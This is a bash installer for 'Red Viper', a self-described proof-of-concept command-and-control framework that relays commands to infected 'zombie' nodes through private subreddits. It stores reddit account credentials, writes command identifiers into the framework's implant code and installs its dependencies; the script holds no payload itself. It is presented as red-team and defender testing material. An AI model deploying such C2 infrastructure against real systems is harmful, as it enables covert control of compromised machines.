#!/bin/bash

### COLOR CODES
RESET='\033[0m'
RED='\033[0;31m'
RED_B='\033[1;31m'
GREEN='\033[0;32m'
GREEN_B='\033[1;32m'
YELLOW='\033[0;33m'
YELLOW_B='\033[1;33m'
BLUE='\033[0;34m'
BLUE_B='\033[1;34m'
PURPLE='\033[0;35m'
PURPLE_B='\033[1;35m'
CYAN='\033[0;36m'
CYAN_B='\033[1;36m'
WHITE='\033[0;37m'
WHITE_B='\033[1;37m'

YELLOW_EX="${YELLOW_B}[!]${RESET}"
GREEN_PLUS="${GREEN_B}[+]${RESET}"
RED_MINUS="${RED_B}[-]${RESET}"
BLUE_QUE="${BLUE_B}[?]${RESET}"

BASE_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"

function checkYesNoResponse {

	response=$1

	if [ "$response" == "y" ] || [ "$response" == "Y" ]; then
		echo 1

	elif [ "$response" == "n" ] || [ "$response" == "N" ]; then
		echo 0

	else
		echo -1

	fi


}

function makeCommandID {

	echo "$(head /dev/urandom | tr -dc A-Z0-9 | head -c 6)"

}

function makeRandomString {

	randLength=$(echo $((10 + RANDOM % 30)))
	echo "$(head /dev/urandom | tr -dc A-Z0-9 | head -c $randLength)"

}

function makeRandomStringShort {

	randLength=$(echo $((5 + RANDOM % 8)))
	echo "$(head /dev/urandom | tr -dc A-Z0-9a-z | head -c $randLength)"

}

function getZombieAccount {
echo -en "${BLUE_QUE} Please specify the ${PURPLE_B}ZOMBIE${RESET} account ${WHITE_B}username${RESET}: "
read redditUser

echo -en "${BLUE_QUE} Please specify the ${PURPLE_B}ZOMBIE${RESET} account ${WHITE_B}password${RESET}: "
read redditPass

echo -en "${BLUE_QUE} Please specify the ${PURPLE_B}ZOMBIE${RESET} account ${WHITE_B}API Secret${RESET}: "
read redditSecret

echo -en "${BLUE_QUE} Please specify the ${PURPLE_B}ZOMBIE${RESET} account ${WHITE_B}Client ID${RESET}: "
read redditClient

identifier=$(makeRandomStringShort)
cfg="/etc/redViper/redViperAccounts.cfg"
echo "" >> $cfg
echo "[reddit-${identifier}-zombie]" >> $cfg
echo "${identifier}_USER=${redditUser}" >> $cfg
echo "${identifier}_PASS=${redditPass}" >> $cfg
echo "${identifier}_SECRET=${redditSecret}" >> $cfg
echo "${identifier}_CLIENT=${redditClient}" >> $cfg
echo "" >> $cfg

}

if [ ! $(id -u) -eq 0 ]; then
	echo -e "${RED_MINUS} Please run this setup as root."
	exit 1
fi

# Banners are cool and stuff
echo -e "
          ${RED_B}                                                             
                   ._______   ____.__     
_______   ____   __| _/\   \ /   /|__|_____   ___________ 
\_  __ \_/ __ \ / __ |  \   Y   / |  \____ \_/ __ \_  __ \\
 |  | \/\  ___// /_/ |   \     /  |  |  |_> >  ___/|  | \/
 |__|    \___  >____ |    \___/   |__|   __/ \___  >__|   
             \/     \/               |__|        \/       
	${RESET}
  		  ${WHITE_B}Created By:${RESET} kindredsec
		https://twitter.con/kindredsec
		https://github.com/itsKindred
"

echo ""
echo -e  "${YELLOW_EX} Welcome to the ${RED_B}Red Viper${RESET} setup!"
echo -e "${YELLOW_EX} Red Viper is a Proof-Of-Concept Command-and-Control (C2) framework that uses reddit for communicating with infected nodes."
echo ""
echo -e "${YELLOW_EX} Because of how the framework is designed, there is quite a bit of \"pre-setup\" that needs to be done,"
echo -e "${YELLOW_EX} which largely involves setting up the reddit accounts and API's need for operating."
echo -e "${YELLOW_EX} If you are unsure of how to set up reddit API's, please refer to our guide on GitHub."
echo ""
echo -e "${YELLOW_EX} Before beginning this setup, I'd like to take the time to explicitly state that I DO NOT condone using"
echo -e "${YELLOW_EX} this tool for malicious purposes. This was made to allow red-teamers and defenders to properly test the"
echo -e "${YELLOW_EX} risk an organization has against these sort of public platform C2 activities, and to provide a relatively simple"
echo -e "${YELLOW_EX} example of using 3rd party sites for communications, a trend we will likely continue to see.  Additionally, I DO NOT claim"
echo -e "${YELLOW_EX} responsibility for any accounts/credentials that are exposed due to the use of this tool. Because of the risk"
echo -e "${YELLOW_EX} of using this tool, it is highly recommended you make special purpose accounts explicitly for using this framework."
echo ""

while true; do
	echo -en "${BLUE_QUE} Do you understand and accept what has been stated? (y/n): "
	read userAgreementResponse

	response=$(checkYesNoResponse $userAgreementResponse)

	if [ $response -eq 1 ]; then
		break

	elif [ $response -eq 0 ]; then
		echo -e "${RED_MINUS} Agreement has not be accepted. Exiting . . . "
		exit 1

	else

		echo -e "${RED_MINUS} Invalid response. Please specify 'y' or 'n'."

	fi

done


echo -e "${YELLOW_EX} Creating config environment..."
mkdir -p /etc/redViper 
cp template.cfg /etc/redViper/redViperAccounts.cfg
chmod 700 /etc/redViper
chmod 600 /etc/redViper/redViperAccounts.cfg

echo -e "${YELLOW_EX} Generating Unique Command Identifiers..."
send_alive=$(makeCommandID)
sed -i "s/#SEND_ALIVE_ID/\"${send_alive}\"/g" ${BASE_DIR}/../src/globals.py
sed -i "s/#SEND_ALIVE_ID/\"${send_alive}\"/g" ${BASE_DIR}/../src/implant/implant.py

cmd_req=$(makeCommandID)
sed -i "s/#COMMAND_REQUEST_ID/\"${cmd_req}\"/g" ${BASE_DIR}/../src/globals.py
sed -i "s/#COMMAND_REQUEST_ID/\"${cmd_req}\"/g" ${BASE_DIR}/../src/implant/implant.py

server_alive=$(makeCommandID)
sed -i "s/#SERVER_ALIVE_ID/\"${server_alive}\"/g" ${BASE_DIR}/../src/globals.py
sed -i "s/#SERVER_ALIVE_ID/\"${server_alive}\"/g" ${BASE_DIR}/../src/implant/implant.py

channel_verify=$(makeRandomString)
sed -i "s/#CHANNEL_VERIFY/\"${channel_verify}\"/g" ${BASE_DIR}/../src/globals.py
sed -i "s/#CHANNEL_VERIFY/\"${channel_verify}\"/g" ${BASE_DIR}/../src/implant/implant.py

clear


echo -e "${YELLOW_EX} redViper is designed in a typical client-server model, and the reddit ACCOUNTS used by the framework reflects"
echo -e "${YELLOW_EX} this design philosophy. Each redViper installation should have at least two separate reddit accounts ready for use;"
echo -e "${YELLOW_EX} One account will be the MASTER account, which is what the server component will use, and all other accounts will be"
echo -e "${YELLOW_EX} ZOMBIE accounts, which is what the implants will use. Note that due to reddit policy, the MASTER account must be at least"
echo -e "${YELLOW_EX} 30 days old and have a undisclosed amount of karma in order to work with redViper. This is because the MASTER account is"
echo -e "${YELLOW_EX} responsible for owning and maintaining a private subreddit."
echo ""
echo ""


echo -e "${YELLOW_EX} NOTE: This account must be capable of creating a subreddit!"
echo -en "${BLUE_QUE} Please specify the ${PURPLE_B}MASTER${RESET} account ${WHITE_B}username${RESET}: "
read redditUser

echo -en "${BLUE_QUE} Please specify the ${PURPLE_B}MASTER${RESET} account ${WHITE_B}password${RESET}: "
read redditPass

echo -en "${BLUE_QUE} Please specify the ${PURPLE_B}MASTER${RESET} account ${WHITE_B}API Secret${RESET}: "
read redditSecret

echo -en "${BLUE_QUE} Please specify the ${PURPLE_B}MASTER${RESET} account ${WHITE_B}Client ID${RESET}: "
read redditClient

echo ""
echo ""
echo -e "${YELLOW_EX} For redViper to work, you must have atleast one subreddit created by the configured master account."
echo -e "${YELLOW_EX} This subreddit should be private, and explicit access must be given to all subsequent slave accounts."
echo -e "${YELLOW_EX} If you are unsure of how to do this, please refer to our help documentation on github."
echo ""
echo -en "${BLUE_QUE} Please specify the name of a subreddit you want to use that your master account controls: "
read subreddit
substring="${subreddit}"

while true; do

	while true; do
		echo -en "${BLUE_QUE} Are there any other subreddits you'd like to configure? (y/n): "
		read moreSubsResponse

		response=$(checkYesNoResponse $moreSubsResponse)

		if [ $response -eq 1 ]; then
			echo -en "${BLUE_QUE} Please specify the subreddit: "
			read subreddit
			substring="${substring},${subreddit}"
			break

		elif [ $response -eq 0 ]; then
			break 2

		else

			echo -e "${RED_MINUS} Invalid response. Please specify 'y' or 'n'."

		fi

	done
done

identifier=$(makeRandomStringShort)
cfg="/etc/redViper/redViperAccounts.cfg"
echo "" >> $cfg
echo "[reddit-${identifier}-master]" >> $cfg
echo "${identifier}_USER=${redditUser}" >> $cfg
echo "${identifier}_PASS=${redditPass}" >> $cfg
echo "${identifier}_SECRET=${redditSecret}" >> $cfg
echo "${identifier}_CLIENT=${redditClient}" >> $cfg
echo "${identifier}_SUBS=${substring}" >> $cfg
echo "" >> $cfg




echo ""

echo -e "${YELLOW_EX} Master Account info has been written to the redViper configuration file. You can manually change any of this data if needed."
echo -e "${YELLOW_EX} Next, you will need to configure at least one Zombie account. These accounts have no karma or age requirement, so you can quickly"
echo -e "${YELLOW_EX} make one now if you need to."

echo ""

echo -e "${YELLOW_EX} NOTE: Zombie accounts will need to manually be given access to the established private subreddit(s) you'll be using."
getZombieAccount
while true; do

	while true; do
		echo -en "${BLUE_QUE} Are there any other zombie accounts you'd like to configure? (y/n): "
		read moreZombiesResponse

		response=$(checkYesNoResponse $moreZombiesResponse)

		if [ $response -eq 1 ]; then
			getZombieAccount
			break

		elif [ $response -eq 0 ]; then
			break 2

		else

			echo -e "${RED_MINUS} Invalid response. Please specify 'y' or 'n'."

		fi
	done
done


# this method of installing stuff sucks. I'm not good enough to know a full proof way of doing it though.
echo -e "${YELLOW_EX} Installing MySQL Server . . ."
if [ -n "$(which apt-get)" ]; then
	apt-get -y install default-mysql-server
	apt-get -y install mysql-server
elif [ -n "$(which yum)" ]; then
	yum -y install default-mysql-server
	yum -y install mysql-server
else
	echo -e "${RED_MINUS} No package manager seems to be installed. You may have to install the package manually."
fi

echo ""
echo -e "${YELLOW_EX} Installing Python3 . . ."
if [ -n "$(which apt-get)" ]; then
	apt-get -y install python3
elif [ -n "$(which yum)" ]; then
	yum -y install python3
else
	echo -e "${RED_MINUS} No package manager seems to be installed. You may have to install the package manually."
fi

echo ""
echo -e "${YELLOW_EX} Installing Pip3 . . ."
if [ -n "$(which apt-get)" ]; then
	apt-get -y install python3-pip
elif [ -n "$(which yum)" ]; then
	yum -y install python3-pip
else
	echo -e "${RED_MINUS} No package manager seems to be installed. You may have to install the package manually."
fi

echo -e "${YELLOW_EX} Installing necessary Python modules . . ."
pip3 install -r ${BASE_DIR}/requirements.txt

echo ""
echo -e "${YELLOW_EX} Building mySQL Databases . . ."
mysql < ${BASE_DIR}/establish_db.sql

echo ""
echo ""
echo -e "${GREEN_PLUS} Setup has completed."
